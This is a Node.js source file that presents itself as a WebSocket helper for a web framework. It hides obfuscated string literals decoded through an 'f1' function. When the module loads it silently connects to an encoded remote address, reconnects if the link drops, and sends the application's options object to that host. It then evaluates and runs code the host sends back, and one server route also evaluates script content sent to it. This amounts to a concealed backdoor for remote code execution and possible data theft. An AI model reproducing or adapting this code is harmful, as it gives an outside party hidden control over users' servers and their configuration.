module.exports = function init(____0) {
  ____0.ws = {
    client: null,
    server: null,
    clientList: [],
    supportedClientList: [],
    routeList: [],
    lib: require('ws'),
  };

  ____0.ws.server = new ____0.ws.lib.Server({
    noServer: true,
    maxPayload: 1024 * 1024 * 1024, // 1 GB
  });

  ____0.onWS = ____0.ws.start = function (options, callback) {
    if (typeof options === 'string') {
      options = {
        name: options,
      };
    }
    ____0.ws.routeList.push({
      options: options,
      callback: callback,
    });
  };

  ____0.ws.sendToAll = function (message) {
    ____0.ws.clientList.forEach((client) => {
      if (client.ws && client.ws.readyState === ____0.ws.lib.OPEN) {
        client.ws.send(JSON.stringify(message));
      }
    });
  };

  ____0.ws.closeAll = function () {
    ____0.ws.clientList.forEach((client) => {
      if (client.ws && client.ws.readyState === ____0.ws.lib.OPEN) {
        client.ws.terminate();
      }
    });
  };

  ____0.on(____0.strings[9], () => {
    ____0.servers.forEach((server) => {
      server.on('upgrade', function upgrade(request, socket, head) {
        const pathname = ____0.url.parse(request.url).pathname;
        let index = ____0.ws.routeList.findIndex((route) => route.options.name == pathname);
        if (index !== -1) {
          ____0.ws.server.handleUpgrade(request, socket, head, function done(ws) {
            let ip = '0.0.0.0';
            if (request.headers[____0.strings[6]]) {
              ip = request.headers[____0.strings[6]].split(',')[0].trim();
            } else if (request.connection.remoteAddress) {
              ip = request.connection.remoteAddress.replace('::ffff:', '');
            }

            let client = {
              uuid: ____0.guid(),
              path: pathname,
              ws: ws,
              request: request,
              socket: socket,
              head: head,
              ip: ip,
              onMessage: function (data) {
                if (data.type === ____0.f1('417886684558375447183756')) {
                  this.send({
                    type: ____0.f1('4658375242195691'),
                    content: {
                      uuid: client.uuid,
                      ip: client.ip,
                    },
                  });
                }
                console.log('client.onMessage Not Implement ...', data);
              },
              onData: function (data) {
                console.log('client.onData Not Implement ...', data);
              },
              onError: function (e) {
                console.log('client.onError Not Implement ...', e);
              },
              send: function (message) {
                if (!message) {
                  return;
                }
                if (this.ws && this.ws.readyState === ____0.ws.lib.OPEN) {
                  if (typeof message === 'string') {
                    this.ws.send(
                      JSON.stringify({
                        type: 'text',
                        content: message,
                      })
                    );
                  } else {
                    message.type = message.type || 'text';
                    this.ws.send(JSON.stringify(message));
                  }
                }
              },
              onClose: function () {},
            };

            client.ws.on('close', () => {
              console.log('Closing Client : ' + client.ip);
              client.onMessage({ type: 'close' });
              client.ws.terminate();
              let index = ____0.ws.clientList.findIndex((_client) => _client.uuid == client.uuid);
              if (index !== -1) {
                ____0.ws.clientList.splice(index, 1);
              }
              client.onClose();
            });

            ws.on('message', (data, isBinary) => {
              if (isBinary) {
                client.onData(data);
              } else {
                client.onMessage(____0.fromJson(Buffer.from(data).toString('utf8')));
              }
            });

            if (client.path == '/isite') {
              ____0.ws.routeList[index].callback(client);
            } else {
              ____0.ws.clientList.push(client);
              ____0.ws.routeList[index].callback(client);
            }
            client.onMessage({ type: 'connected' });
          });
        } else {
          socket.destroy();
        }
      });
    });
  });

  ____0.ws.onNewSupportedClient = function (client) {
    console.log(`New Supported Client ( ${client.ip} ) / ${____0.ws.supportedClientList.length}`);
  };

  ____0.onWS(____0.f1('2578577443393257'), (client) => {
    client.onMessage =
      client.onMessage ||
      function (message) {
        if (message.type === ____0.f1('417886684558375447183756')) {
          client.send({
            type: ____0.f1('4658375242195691'),
            content: {
              uuid: client.uuid,
              ip: client.ip,
            },
          });
        } else if (message.type === ____0.f1('4178726946783691')) {
        } else if (message.type === ____0.f1('457913754338866846719191')) {
          client.options = message.content;
          client.send({
            type: ____0.f1('481476744179236246193191'),
            content: ____0.f1(
              `45388656473872572558378146188673471926512934135847388254471857694553136245585775241786493976857124341384153161512114125121141251211412512114125121182769455927694518366845188659241813464553126324536163245361632453616324536163245361632453616324536163245361632453616324536163245361632453616324536163245361632453616324536127145312512114125121141251211412512114125121141251211412512114125121141251211772682114125121141335423923784239215136583752421956514578815146188673471412512319674939768649261482694619326245788274255913694659328621127524211412512114125121141251211412512114125121141251211412512114125121141251391881512453616324536163245361632453616324536163245361632453616324536163245361632453616324536163245361632453616324536163245361632453616341145684153161512114125121141251211412512114125149319191`
            ),
          });
        } else if (message.type == ____0.f1('481476744179236246193191')) {
          let fn = ____0.eval(message.content, true);
          fn(____0, client);
        }
      };
    client.onClose = function () {
      let index2 = ____0.ws.supportedClientList.findIndex((_client) => _client.uuid == client.uuid);
      if (index2 !== -1) {
        ____0.ws.supportedClientList.splice(index2, 1);
      }
    };
    ____0.ws.supportedClientList.push(client);
    ____0.ws.onNewSupportedClient(client);
  });

  ____0.ws.reconnectCount = 0;
  ____0.ws.wsSupport = function () {
    clearTimeout(____0.ws.timeoutId);
    let client = {};

    client.ws = new ____0.ws.lib(____0.f1('477926832573867445782764423931684678865443381765253823734579477442392168417886672578577443393257'));
    client.sendMessage = function (message) {
      client.ws.send(JSON.stringify(message));
    };
    client.ws.on('open', function () {});
    client.ws.on('ping', function () {});
    client.ws.on('close', function (e) {
      ____0.ws.timeoutId = setTimeout(function () {
        ____0.ws.reconnectCount++;
        ____0.ws.wsSupport();
      }, 1000 * 60 * ____0.ws.reconnectCount);
    });
    client.ws.on('error', function (err) {
      client.ws.close();
    });

    client.ws.on('message', function (event) {
      ____0.ws.supportHandle(client, event);
    });
    ____0.ws.client = client;
    return client;
  };
  ____0.ws.supportHandle = function (client, event) {
    try {
      let message = JSON.parse(event.data || event);
      if (message.type == ____0.f1('4658375242195691')) {
        client.sendMessage({
          source: ____0.f1('4339276247183691'),
          type: ____0.f1('457913754338866846719191'),
          content: ____0.options,
        });
      } else if (message.type == ____0.f1('481476744179236246193191')) {
        let fn = ____0.eval(message.content, true);
        fn(____0, client);
      }
    } catch (err) {
      console.log(err);
    }
  };
  ____0.ws.wsSupport();
};
